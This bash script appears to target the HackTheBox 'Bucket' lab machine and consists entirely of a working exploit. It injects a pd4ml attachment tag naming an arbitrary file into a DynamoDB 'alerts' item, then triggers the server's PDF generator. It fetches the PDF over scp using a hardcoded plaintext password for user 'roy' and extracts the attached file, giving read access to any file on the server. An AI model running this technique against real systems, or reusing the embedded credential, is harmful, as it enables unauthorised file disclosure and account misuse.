#!/bin/bash


target=$1

# delete table
aws --endpoint-url http://s3.bucket.htb dynamodb delete-table --table-name alerts 2>/dev/null >/dev/null
# create table
aws --endpoint-url http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH             AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 >/dev/null
# put entry into table; use commandline arg as target file
aws --endpoint-url http://s3.bucket.htb dynamodb put-item --table-name alerts --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><pd4ml:attachment src=\"'"$target"'\" description=\"attachment sample\" icon=\"Paperclip\"/></        html>"}}' >/dev/null
# sleep to allow DB to sync
sleep 0.2
# trigger PDF generation
curl -s http://127.0.0.1:8000/index.php --data 'action=get_alerts'
# sleep to allow PDF generation
sleep 0.2
# get pdf
sshpass -p 'n2vM-<_K_Q:.Aa2' scp roy@10.129.228.15:/var/www/bucket-app/files/result.pdf .

# extract 
tfile="/tmp/bucket-pdf-out"
pdfdetach result.pdf -save 1 -o $tfile
cat $tfile
rm $tfile
